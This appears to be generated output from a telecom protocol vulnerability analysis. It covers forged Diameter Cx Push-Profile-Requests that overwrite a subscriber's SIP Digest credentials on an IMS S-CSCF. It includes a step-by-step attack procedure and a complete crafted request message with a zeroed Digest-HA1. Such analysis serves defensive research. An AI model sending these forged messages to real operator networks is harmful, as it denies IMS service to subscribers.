@@ -1,0 +1,159 @@
+**Threat Model:**
+
+- **Attack Assumption:**
+  - The victim is an **S-CSCF** exposing its **Cx Diameter client** role to the Internet.
+  - The attacker can impersonate the **HSS / Diameter Multimedia Server** role and establish an unauthenticated Diameter connection to that S-CSCF.
+  - The victim accepts attacker-crafted **Push-Profile-Request (PPR)** messages on that connection.
+  - The attacker knows a valid **private user identity** in `User-Name` that is already known to the target S-CSCF.
+
+- **Attacker Capability:**
+  - The attacker can only send crafted **PPR requests** to the S-CSCF and receive the corresponding answers.
+  - The attacker cannot intercept or modify legitimate HSS<->S-CSCF traffic.
+  - The attacker has no radio, bearer-plane, or SIP signaling vantage point beyond causing the S-CSCF to consume forged Cx updates.
+  - Any impact must therefore come from the S-CSCF accepting and storing the forged **`SIP-Auth-Data-Item`** for later IMS authentication use.
+
+**Exploitability Analysis:**
+
+`3GPP-SIP-Auth-Data-Item.3GPP-SIP-Auth-Data-Item` in this context is the **grouped `SIP-Auth-Data-Item` AVP** carried in a **Cx Push-Profile-Request**. The normal sender is the **HSS**, and the receiver that processes the field is the **S-CSCF**.
+
+This field is not descriptive metadata. Per the supplied protocol evidence, in PPR it is the vehicle for **pushing updated SIP Digest authentication information** to the S-CSCF when authentication data has changed in the HSS. The S-CSCF processes it as **authoritative subscriber authentication state** keyed by the enclosing `User-Name` private identity.
+
+Field placement matters here:
+
+- Message: **PPR** on Cx
+- Top-level grouped AVP: **`SIP-Auth-Data-Item`**
+- Scope: **per subscriber** identified by `User-Name`
+- Meaningful child content for this use: `SIP-Authentication-Scheme` plus digest-specific material such as `SIP-Digest-Authenticate` and its digest children
+
+The receiver action is concrete: the S-CSCF updates its stored **SIP Digest authentication data** for that subscriber and later uses that stored data in **IMS SIP authentication**. This is explicitly different from merely accepting a forged PPR in general. A forged PPR could also carry `User-Data` or charging information, but this specific field changes the **authentication material** itself.
+
+That creates a distinct field-driven exploit chain:
+
+1. Attacker forges a PPR to the serving S-CSCF for a known subscriber.
+2. The PPR contains a malicious but protocol-plausible `SIP-Auth-Data-Item`.
+3. The S-CSCF stores that item as the current Digest authentication data for the subscriber.
+4. On the subscriber's next SIP Digest authentication event, the S-CSCF uses the forged values.
+5. Authentication then fails or mismatches, causing **IMS registration failure or denial of authenticated SIP service** for that subscriber.
+
+This effect is attributable to the field itself because the operational consequence depends on the **contents** of `SIP-Auth-Data-Item`:
+- altering `Digest-HA1`, realm, algorithm, or related digest parameters changes later authentication behavior;
+- omitting this field and forging only the enclosing PPR would not specifically corrupt SIP Digest authentication state.
+
+The state impact is also meaningful. The evidence states that for SIP Digest, HA1 is permanent subscriber data stored in the HSS and S-CSCF, and that PPR exists specifically to refresh stored data after password change. So the forged value is not transaction-local; it is **stored per subscriber** and persists until legitimate overwrite or context removal.
+
+Recovery is not immediate. The bad state is corrected only when:
+- a later legitimate HSS-triggered PPR updates authentication data again, or
+- the subscriber context is removed and later repopulated.
+
+Thus the forged field can create a stale authentication state that persists long enough to deny IMS service.
+
+Under the constrained threat model, this is independently exploitable because:
+1. the attacker can send the forged request;
+2. the S-CSCF processes the field as authoritative input;
+3. the field value itself changes stored authentication state;
+4. later IMS authentication behavior changes in a security-relevant way.
+
+**Attack Procedure:**
+
+1. Establish a Diameter connection to the target **S-CSCF** while impersonating the expected **HSS** peer role.
+2. Send a minimally coherent **Push-Profile-Request** with:
+   - command code **305**
+   - application id **16777216**
+   - mandatory routing/session AVPs
+   - `User-Name` set to a private identity already known to that S-CSCF
+   - one update payload: `SIP-Auth-Data-Item`
+3. Inside `SIP-Auth-Data-Item`, set:
+   - `SIP-Authentication-Scheme` to **SIP Digest**
+   - digest payload fields to a malicious test value, e.g. a forged **`Digest-HA1`** inconsistent with the real subscriber password
+4. Exclude unrelated profile or charging AVPs; include only mandatory/coherence-related fields and the grouped auth payload needed to exercise the target field.
+5. Expected success condition:
+   - the S-CSCF accepts the PPR and stores the pushed digest data;
+   - at the subscriber's next IMS SIP Digest authentication, registration/authentication fails because the S-CSCF now uses the attacker-supplied auth material.
+
+**Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 305,
+    "application_id": 16777216,
+    "request": true,
+    "proxiable": true
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "attacker-hss.example.net;1710000000;1"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777216
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "hss.attacker.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "attacker.example.net"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "scscf1.visited-ims.example.com"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "visited-ims.example.com"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "sip:private-user-001@ims.example.com"
+    },
+    {
+      "avp_name": "SIP-Auth-Data-Item",
+      "grouped_avp": [
+        {
+          "avp_name": "SIP-Authentication-Scheme",
+          "avp_value": "SIP Digest"
+        },
+        {
+          "avp_name": "SIP-Digest-Authenticate",
+          "grouped_avp": [
+            {
+              "avp_name": "Digest-Realm",
+              "avp_value": "ims.example.com"
+            },
+            {
+              "avp_name": "Digest-QoP",
+              "avp_value": "auth"
+            },
+            {
+              "avp_name": "Digest-Algorithm",
+              "avp_value": "MD5"
+            },
+            {
+              "avp_name": "Digest-HA1",
+              "avp_value": "00000000000000000000000000000000"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
+```
+
+**Classification:**
+- `EXPLOITABLE`
